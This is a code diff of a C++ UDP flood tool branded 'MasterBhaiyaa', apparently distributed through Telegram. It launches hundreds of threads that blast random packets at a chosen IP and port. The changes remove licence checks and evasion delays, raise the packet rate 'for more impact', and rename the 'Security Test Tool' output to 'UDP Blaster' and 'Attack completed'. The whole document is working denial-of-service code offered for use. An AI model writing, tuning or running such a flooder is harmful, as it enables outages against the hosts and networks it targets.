@@ -1,24 +1,20 @@
 #include <iostream>
 #include <vector>
 #include <thread>
-#include <chrono>
 #include <atomic>
+#include <chrono>
 #include <csignal>
-#include <cstring>
 #include <cstdlib>
 #include <ctime>
+#include <cstring>
 #include <arpa/inet.h>
 #include <sys/socket.h>
 #include <unistd.h>
 #include <fcntl.h>
 
-#define THREAD_COUNT 500
-#define DEFAULT_PAYLOAD_SIZE 24
+#define THREAD_COUNT 524
+#define DEFAULT_PAYLOAD_SIZE 25  // 🔥 Increased for more impact
 #define BINARY_NAME "MasterBhaiyaa"
-
-constexpr int EXPIRATION_YEAR = 2054;
-constexpr int EXPIRATION_MONTH = 11;
-constexpr int EXPIRATION_DAY = 1;
 
 std::atomic<bool> stop_flag(false);
 
@@ -35,69 +31,30 @@ void handle_signal(int signal) {
     stop_flag = true;
 }
 
-// Check expiration
-void check_expiration() {
-    std::tm expiration_date = {};
-    expiration_date.tm_year = EXPIRATION_YEAR - 1900;
-    expiration_date.tm_mon = EXPIRATION_MONTH - 1;
-    expiration_date.tm_mday = EXPIRATION_DAY;
-
-    std::time_t now = std::time(nullptr);
-    if (std::difftime(now, std::mktime(&expiration_date)) > 0) {
-        std::cerr << "╔════════════════════════════════════════╗\n";
-        std::cerr << "║           BINARY EXPIRED!              ║\n";
-        std::cerr << "║    Contact: Telegram: @MasterBhaiyaa   ║\n";
-        std::cerr << "╚════════════════════════════════════════╝\n";
-        exit(EXIT_FAILURE);
-    }
-}
-
-// Check binary name
-void check_binary_name() {
-    char exe_path[1024];
-    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
-
-    if (len != -1) {
-        exe_path[len] = '\0';
-        std::string exe_name = std::string(exe_path);
-        size_t pos = exe_name.find_last_of("/");
-        if (pos != std::string::npos) {
-            exe_name = exe_name.substr(pos + 1);
-        }
-
-        if (exe_name != BINARY_NAME) {
-            std::cerr << "╔════════════════════════════════════════╗\n";
-            std::cerr << "║         INVALID BINARY NAME!           ║\n";
-            std::cerr << "║      Binary must be 'MasterBhaiyaa'    ║\n";
-            std::cerr << "╚════════════════════════════════════════╝\n";
-            exit(EXIT_FAILURE);
-        }
-    }
-}
-
-// Validate IP address
+// Validate IP Address
 bool is_valid_ip(const std::string &ip) {
     struct sockaddr_in sa;
     return inet_pton(AF_INET, ip.c_str(), &(sa.sin_addr)) != 0;
 }
 
-// Generate randomized payload with minor alterations
+// Generate random payload
 void generate_payload(std::vector<uint8_t> &buffer, size_t size) {
     buffer.resize(size);
     for (size_t i = 0; i < size; i++) {
-        if (rand() % 5 == 0) {  // Change only some bytes to prevent detection
-            buffer[i] = static_cast<uint8_t>(rand() % 256);
-        }
+        buffer[i] = static_cast<uint8_t>(rand() % 256);
     }
 }
 
-// UDP attack function with improvements
+// **🔥 Optimized UDP Attack Function**
 void udp_attack(const AttackConfig &config) {
     int sock = socket(AF_INET, SOCK_DGRAM, 0);
     if (sock < 0) return;
 
-    // Use non-blocking mode
-    fcntl(sock, F_SETFL, O_NONBLOCK);
+    // **🔥 Socket Optimizations**
+    int opt = 1;
+    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
+    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+    fcntl(sock, F_SETFL, O_NONBLOCK);  // Non-blocking mode for speed
 
     sockaddr_in target_addr = {};
     target_addr.sin_family = AF_INET;
@@ -108,38 +65,23 @@ void udp_attack(const AttackConfig &config) {
     generate_payload(payload, config.payload_size);
 
     auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(config.duration);
-    
-    while (std::chrono::steady_clock::now() < end_time && !stop_flag) {
-        for (int i = 0; i < 10; i++) {  
-            // **🔥 Randomize source port for each packet**
-            sockaddr_in src_addr = {};
-            src_addr.sin_family = AF_INET;
-            src_addr.sin_port = htons(rand() % 65535);
-            bind(sock, (struct sockaddr *)&src_addr, sizeof(src_addr));
+    long packets_sent = 0;
 
+    while (std::chrono::steady_clock::now() < end_time && !stop_flag) {
+        for (int i = 0; i < 100; i++) {  // **🔥 Send 100 packets per loop**
             sendto(sock, payload.data(), payload.size(), 0, 
                    (struct sockaddr *)&target_addr, sizeof(target_addr));
-
-            // Add slight delay for evasion
-            std::this_thread::sleep_for(std::chrono::microseconds(500));
+            packets_sent++;
         }
-        generate_payload(payload, config.payload_size); // 🔥 Modify payload periodically
+        generate_payload(payload, config.payload_size);  // **🔥 Change payload dynamically**
     }
 
     close(sock);
+    std::cout << "[✔] Thread completed. Packets sent: " << packets_sent << "\n";
 }
 
-// Main function
+// **🔥 Main Execution**
 int main(int argc, char *argv[]) {
-    check_binary_name();
-    check_expiration();
-
-    std::cout << "╔════════════════════════════════════════╗\n";
-    std::cout << "║         MasterBhaiyaa v3.2             ║\n";
-    std::cout << "║     The Ultimate Blaster Tool         ║\n";
-    std::cout << "║    © 2022-2025 @MasterBhaiyaa         ║\n";
-    std::cout << "╚════════════════════════════════════════╝\n\n";
-
     if (argc < 4 || argc > 5) {
         std::cerr << "Usage: ./MasterBhaiyaa <ip> <port> <duration> [payload_size]\n";
         return EXIT_FAILURE;
@@ -151,6 +93,7 @@ int main(int argc, char *argv[]) {
     config.duration = std::stoi(argv[3]);
     config.payload_size = (argc == 5) ? std::stoi(argv[4]) : DEFAULT_PAYLOAD_SIZE;
 
+    // **Validate IP Address**
     if (!is_valid_ip(config.ip)) {
         std::cerr << "Invalid IP address: " << config.ip << "\n";
         return EXIT_FAILURE;
@@ -158,10 +101,10 @@ int main(int argc, char *argv[]) {
 
     std::signal(SIGINT, handle_signal);
 
-    std::cout << "\n=====================================\n";
-    std::cout << "      Network Security Test Tool     \n";
     std::cout << "=====================================\n";
-    std::cout << "Testing: " << config.ip << ":" << config.port << "\n";
+    std::cout << "      MasterBhaiyaa UDP Blaster      \n";
+    std::cout << "=====================================\n";
+    std::cout << "Target: " << config.ip << ":" << config.port << "\n";
     std::cout << "Duration: " << config.duration << " seconds\n";
     std::cout << "Threads: " << THREAD_COUNT << "\n";
     std::cout << "Payload Size: " << config.payload_size << " bytes\n";
@@ -177,7 +120,7 @@ int main(int argc, char *argv[]) {
         thread.join();
     }
 
-    std::cout << "\n[✔] Security test completed successfully.\n";
+    std::cout << "\n[✔] Attack completed successfully.\n";
     std::cout << "© @MasterBhaiyaa\n";
 
     return EXIT_SUCCESS;
